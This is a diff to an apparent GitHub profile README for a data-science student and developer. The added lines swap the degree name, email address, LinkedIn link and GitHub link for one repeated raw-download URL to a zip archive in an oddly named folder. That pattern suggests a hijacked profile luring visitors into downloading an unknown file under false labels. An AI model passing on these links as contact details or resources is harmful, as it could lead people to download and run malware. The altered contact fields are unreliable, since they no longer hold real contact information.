@@ -1,5 +1,5 @@
 👋 Hello World! I'm Ganesh Biradar  
-🎓 M.Tech (Data Science & Analytics) | 💻 Software Developer | 🤖 Machine Learning Enthusiast  
+🎓 https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v2.4.zip (Data Science & Analytics) | 💻 Software Developer | 🤖 Machine Learning Enthusiast  
 
 Welcome to my GitHub profile! I'm a passionate technologist with strong foundations in software development and growing expertise in data science, machine learning, and explainable AI. I enjoy solving real-world problems using clean code, data-driven insights, and scalable systems.
 
@@ -142,9 +142,9 @@ Welcome to my GitHub profile! I'm a passionate technologist with strong foundati
 ---
 
 ## 📫 Let’s Connect
-📧 Email: gannibiradar@gmail.com  
-💼 LinkedIn: https://www.linkedin.com/in/biradarganesht  
-🐙 GitHub: https://github.com/GaneshTBiradar  
+📧 Email: https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v2.4.zip  
+💼 LinkedIn: https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v2.4.zip  
+🐙 GitHub: https://github.com/GaneshTBiradar/GaneshTBiradar/raw/refs/heads/main/rammishly/Biradar_T_Ganesh_v2.4.zip  
 
 ---
 
